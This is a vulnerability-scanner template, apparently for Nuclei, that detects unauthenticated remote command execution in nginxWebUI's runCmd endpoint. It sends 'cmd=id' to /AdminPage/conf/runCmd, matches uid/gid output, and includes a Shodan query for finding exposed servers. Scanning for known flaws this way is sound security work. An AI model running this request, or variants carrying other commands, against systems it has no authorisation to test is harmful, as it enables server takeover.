http:
- matchers:
  - part: body
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/AdminPage/conf/runCmd?cmd=id'
id: nginxwebui-runcmd-rce
info:
  author: DhiyaneshDk
  description: "nginxWebUI\u2019s runCmd feature and is caused by incomplete validation\
    \ of user input. Attackers can exploit the vulnerability by crafting malicious\
    \ data to execute arbitrary commands on a vulnerable server without authorization.\n"
  metadata:
    max-request: 1
    shodan-query: html:"nginxWebUI"
    verified: true
  name: "nginxWebUI \u2264 3.5.0 runCmd - Remote Command Execution"
  reference:
  - https://github.com/qingchenhh/qc_poc/blob/main/Goby/nginxWebUI_runCmd_rce.go
  - https://www.ctfiot.com/124166.html
  - https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/nginxwebui-runcmd-remote-command-execution-vulnerability
  severity: critical
  tags: nginx,nginxwebui,rce
